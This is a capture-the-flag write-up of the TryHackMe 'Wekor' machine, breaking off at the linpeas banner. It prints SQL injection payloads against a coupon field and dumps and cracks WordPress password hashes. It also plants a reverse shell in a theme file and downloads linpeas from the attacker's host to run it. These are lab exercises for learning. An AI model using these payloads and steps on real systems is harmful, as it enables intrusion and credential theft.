# Wekor — Writeup

## Overview
### Wekor — Writeup
### Wekor — Writeup
----
CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;)
---
![123](https://tryhackme-images.s3.amazonaws.com/room-icons/e27d2e539f0105c9a45a7892234229c5.jpeg)
### Introduction
Start Machine
Hey Everyone! This Box is just a little CTF I've prepared recently. I hope you enjoy it as it is my first time ever creating something like this !
This CTF is focused primarily on enumeration, better understanding of services and thinking out of the box for some parts of this machine.
Feel free to ask any questions...It's okay to be confused in some parts of the box ;)
Just a quick note, Please use the domain : "wekor.thm" as it could be useful later on in the box ;)
Answer the questions below
Deploy The Machine!
Completed
### Finishing Up
Time To Submit The Flags :)
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/bug_hunter/github-search]
└─$ rustscan -a 10.10.101.47 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.101.47:22
Open 10.10.101.47:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.101.47 [2 ports]
Discovered open port 22/tcp on 10.10.101.47
Discovered open port 80/tcp on 10.10.101.47
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.101.47
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.101.47.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.101.47
Host is up, received user-set (0.24s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95c3ceaf07fae28e2904e4cd146a21b5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
|   256 4d99b568afbb4e66ce7270e6e3f896a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
|   256 0de57de81a12c0ddb7665e98345559f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.66 seconds

┌──(witty㉿kali)-[~/bug_hunter/github-search]
└─$ sudo nano /etc/hosts          
[sudo] password for witty: 
                                                                                                                     
┌──(witty㉿kali)-[~/bug_hunter/github-search]
└─$ tail /etc/hosts
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm

┌──(witty㉿kali)-[~/bug_hunter/github-search]
└─$ gobuster -t 64 dir -e -k -u http://10.10.101.47 -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.101.47
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.101.47/.hta                 (Status: 403) [Size: 277]
http://10.10.101.47/.htaccess            (Status: 403) [Size: 277]
http://10.10.101.47/.htpasswd            (Status: 403) [Size: 277]
http://10.10.101.47/index.html           (Status: 200) [Size: 23]
http://10.10.101.47/robots.txt           (Status: 200) [Size: 188]
http://10.10.101.47/server-status        (Status: 403) [Size: 277]
Progress: 4606 / 4615 (99.80%)
===============================================================
 Finished
===============================================================

http://10.10.101.47/comingreallysoon/

Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 

http://10.10.101.47/it-next/

apply coupon code

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1

using burp and sqlmap

POST /it-next/it_cart.php HTTP/1.1
Host: 10.10.101.47
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.10.101.47
Connection: close
Referer: http://10.10.101.47/it-next/it_cart.php
Upgrade-Insecure-Requests: 1

coupon_code=%27&apply_coupon=Apply+Coupon

save item

┌──(witty㉿kali)-[~/Downloads]
└─$ cat wekor 
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2022.8.2" exportTime="Mon Mar 13 12:29:54 EDT 2023">
  <item>
    <time>Mon Mar 13 12:28:48 EDT 2023</time>
    <url><![CDATA[http://10.10.101.47/it-next/it_cart.php]]></url>
    <host ip="10.10.101.47">10.10.101.47</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/it-next/it_cart.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvaXQtbmV4dC9pdF9jYXJ0LnBocCBIVFRQLzEuMQ0KSG9zdDogMTAuMTAuMTAxLjQ3DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA0MQ0KT3JpZ2luOiBodHRwOi8vMTAuMTAuMTAxLjQ3DQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovLzEwLjEwLjEwMS40Ny9pdC1uZXh0L2l0X2NhcnQucGhwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCmNvdXBvbl9jb2RlPSUyNyZhcHBseV9jb3Vwb249QXBwbHkrQ291cG9u]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r /home/witty/Downloads/wekor --dump

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r wekor --dbs        
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:50:08 //

[12:50:08] [INFO] parsing HTTP request from 'wekor'
[12:50:08] [WARNING] it appears that you have provided tainted parameter values ('coupon_code='') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[12:50:11] [INFO] resuming back-end DBMS 'mysql' 
[12:50:11] [INFO] testing connection to the target URL
[12:50:12] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: coupon_code (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=' AND GTID_SUBSET(CONCAT(0x717a717671,(SELECT (ELT(9852=9852,1))),0x7162787871),9852)-- rTzX&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=' AND (SELECT 4682 FROM (SELECT(SLEEP(5)))eKtS)-- PUwB&apply_coupon=Apply Coupon

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: coupon_code=' UNION ALL SELECT NULL,CONCAT(0x717a717671,0x55535277574c565368627a6e4561737a526f6d42494c59675758416b56426a654778644f5865734c,0x7162787871),NULL-- -&apply_coupon=Apply Coupon
---
[12:50:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[12:50:12] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress

[12:50:12] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.101.47'

[*] ending @ 12:50:12 //

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r wekor --dbs -D wordpress --tables     
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:52:04 //

[12:52:04] [INFO] parsing HTTP request from 'wekor'
[12:52:04] [WARNING] it appears that you have provided tainted parameter values ('coupon_code='') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[12:52:08] [INFO] resuming back-end DBMS 'mysql' 
[12:52:08] [INFO] testing connection to the target URL
[12:52:09] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: coupon_code (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=' AND GTID_SUBSET(CONCAT(0x717a717671,(SELECT (ELT(9852=9852,1))),0x7162787871),9852)-- rTzX&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=' AND (SELECT 4682 FROM (SELECT(SLEEP(5)))eKtS)-- PUwB&apply_coupon=Apply Coupon

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: coupon_code=' UNION ALL SELECT NULL,CONCAT(0x717a717671,0x55535277574c565368627a6e4561737a526f6d42494c59675758416b56426a654778644f5865734c,0x7162787871),NULL-- -&apply_coupon=Apply Coupon
---
[12:52:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[12:52:09] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress

[12:52:09] [INFO] fetching tables for database: 'wordpress'
Database: wordpress
[12 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

[12:52:09] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.101.47'

[*] ending @ 12:52:09 //

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r wekor --dbs -D wordpress -T wp_users --columns
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:53:10 //

[12:53:10] [INFO] parsing HTTP request from 'wekor'
[12:53:10] [WARNING] it appears that you have provided tainted parameter values ('coupon_code='') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[12:53:12] [INFO] resuming back-end DBMS 'mysql' 
[12:53:12] [INFO] testing connection to the target URL
[12:53:13] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: coupon_code (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=' AND GTID_SUBSET(CONCAT(0x717a717671,(SELECT (ELT(9852=9852,1))),0x7162787871),9852)-- rTzX&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=' AND (SELECT 4682 FROM (SELECT(SLEEP(5)))eKtS)-- PUwB&apply_coupon=Apply Coupon

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: coupon_code=' UNION ALL SELECT NULL,CONCAT(0x717a717671,0x55535277574c565368627a6e4561737a526f6d42494c59675758416b56426a654778644f5865734c,0x7162787871),NULL-- -&apply_coupon=Apply Coupon
---
[12:53:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[12:53:13] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress

[12:53:13] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
Database: wordpress
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+

[12:53:13] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.101.47'

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r wekor --dbs -D wordpress -T wp_users --columns --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:55:18 //

[12:55:18] [INFO] parsing HTTP request from 'wekor'
[12:55:18] [WARNING] it appears that you have provided tainted parameter values ('coupon_code='') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[12:55:20] [INFO] resuming back-end DBMS 'mysql' 
[12:55:20] [INFO] testing connection to the target URL
[12:55:21] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: coupon_code (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=' AND GTID_SUBSET(CONCAT(0x717a717671,(SELECT (ELT(9852=9852,1))),0x7162787871),9852)-- rTzX&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=' AND (SELECT 4682 FROM (SELECT(SLEEP(5)))eKtS)-- PUwB&apply_coupon=Apply Coupon

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: coupon_code=' UNION ALL SELECT NULL,CONCAT(0x717a717671,0x55535277574c565368627a6e4561737a526f6d42494c59675758416b56426a654778644f5865734c,0x7162787871),NULL-- -&apply_coupon=Apply Coupon
---
[12:55:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[12:55:21] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress

[12:55:21] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
Database: wordpress
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+

[12:55:21] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
[12:55:21] [INFO] fetching entries for table 'wp_users' in database 'wordpress'
[12:55:21] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: wordpress
Table: wp_users
[4 entries]
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin@wekor.thm   | admin      | 0           | admin        | admin         |  | <blank>                                       |
| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    |  | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       |  | <blank>                                       |
| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      |  | <blank>                                       |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+

[12:55:32] [INFO] table 'wordpress.wp_users' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.101.47/dump/wordpress/wp_users.csv'
[12:55:32] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.101.47'

[*] ending @ 12:55:32 //

here I see a subdomain  http://site.wekor.thm/wordpress

let's crack the hashes

┌──(witty㉿kali)-[~/Downloads]
└─$ mousepad wekor_users                                              
                                                                                                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ cat wekor_users
$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. 
$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 
$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ 
$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/

┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt wekor_users
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
No password hashes left to crack (see FAQ)
                                                                                                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ john --show wekor_users                                     
?:rockyou  wp_jeffrey
?:soccer13 wp_yura 
?:xxxxxx   wp_eagle

3 password hashes cracked, 0 left

admin cannot cracked

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster vhost -u http://wekor.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 64 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://wekor.thm
[+] Method:          GET
[+] Threads:         64
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: site.wekor.thm Status: 200 [Size: 143]

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm

http://site.wekor.thm/
Hi there! Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS! - Jim 

http://site.wekor.thm/wordpress/wp-admin

wp_jeffrey rockyou (not privileges)
 wp_yura soccer13 (yes)

theme edit

http://site.wekor.thm/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone

upload a revshell like PentestMonkey or Ivan Sincek (bypass WAF and AV)

https://www.revshells.com/

I'm using Ivan Sincek

edit and ave it then go to http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.101.47] 47418
SOCKET: Shell has connected! PID: 2087
python3 -c 'import pty;pty.spawn("/bin/bash")'
<r.thm/wordpress/wp-content/themes/twentytwentyone$ whoami
whoami
www-data

let's upload linpeas.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.101.47 - - [13/Mar/2023 13:24:43] "GET /linpeas.sh HTTP/1.1" 200 -

<r.thm/wordpress/wp-content/themes/twentytwentyone$ cd /tmp
cd /tmp
www-data@osboxes:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
wget http://10.8.19.103:1234/linpeas.sh
--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 808.69K   337KB/s    in 2.4s    

(337 KB/s) - 'linpeas.sh' saved [828098/828098]

www-data@osboxes:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@osboxes:/tmp$ ./linpeas.sh

chmod +x linpeas.sh
www-data@osboxes:/tmp$ ./linpeas.sh
./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
